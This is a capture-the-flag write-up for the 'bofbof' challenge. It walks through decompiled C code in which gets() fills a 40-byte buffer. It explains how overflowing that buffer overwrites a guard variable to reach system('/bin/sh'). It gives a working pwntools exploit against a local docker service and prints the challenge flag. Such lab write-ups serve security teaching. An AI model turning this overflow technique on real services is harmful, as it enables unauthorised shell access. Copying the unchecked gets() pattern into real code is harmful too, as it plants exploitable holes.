# Solution to bofbof

After launching the docker, we can connect to the challenge using netcat (`nc localhost 4000`).

It looks quite normal, we get asked a question a give an answer, then the program stops.

## Analysing the file

Since we have the binary file, we can decompile it, I'm using Ghidra.

In Ghidra, we get the `main` function:

```C
undefined8 main(void)

{
  char local_38 [40];
  long local_10;
  
  local_10 = 0x4141414141414141;
  printf("Comment est votre blanquette ?\n>>> ");
  fflush(stdout);
  gets(local_38);
  if (local_10 != 0x4141414141414141) {
    if (local_10 == 0x1122334455667788) {
      vuln();
    }
    puts("Almost there!");
  }
  return 0;
}
```

The code is quite easy to read fortunately:
* We declare two variables, initialize the first one
* Store the input of the user in the second one 
* Checks the value of `local_10`
* Launch the `vuln` function

This `vuln` function seems quite suspicious, we check it out:

```C
void vuln(void)

{
  system("/bin/sh");
  exit(1);
}
```

So it opens a shell ! But how do we enter here ? 

## Exploiting the vulnerability

When we read the code, we assign a value to `local_10` and then check if it's equal to something else ? How is it possible ?

Well, when we look at `local_38`, we see that it was declared with a size of 40 bytes (`char local_38 [40]`), and the input of the user is stored in that variable.

But what happens if the input is bigger than 40 bytes ? This is a buffer overflow, and basically, all the excess of bytes given by the user will be written on top of the memory of the following objects.

Here, `local_10` was declared just after `local_38`, which means that the overflow made by `local_38` will we written in `local_10` !
In other words, if we write over 40 characters in input, the excess will overwrite the memory of `local_10`.

## Performing the buffer overflow

So now we know that we just need to write 40 random letters, and then a specific list of bytes to overwrite the value of `local_10`.

Based on the code, we see that the value needed to launch the `vuln` function is `0x1122334455667788`.

Written in bytes, this is simply `\x11\x22\x33\x44\x55\x66\x77\x88`, but it will be encoded using a little endian which means you have to give it reversed: `\x88\x77\x66\x55\x44\x33\x22\x11`.

If you have doubts, you can use the function `p64()` from *pwntools* which will do it properly.

Let's use Python to do our exploit:
```Python
from pwn import *

HOST, PORT = "127.0.0.1", 4000

r = remote(HOST, PORT)

trafic = r.recv()
print(trafic.decode())

r.sendline(b"a"*40 + b"\x88\x77\x66\x55\x44\x33\x22\x11")
r.interactive()
```

We initiate the connection in local host, then send a line containing 40 random letters, and our bytes !
Then, using the `interactive()` method, we can write in the terminal directly after this line.

We launch the code, and after the execution, we can write `cat flag.txt` to print the flag: `FCSC{ec30a448a777b571734d8d9e4036b3a6e87d1005446f80dffb26c3e4f5cd02ba}`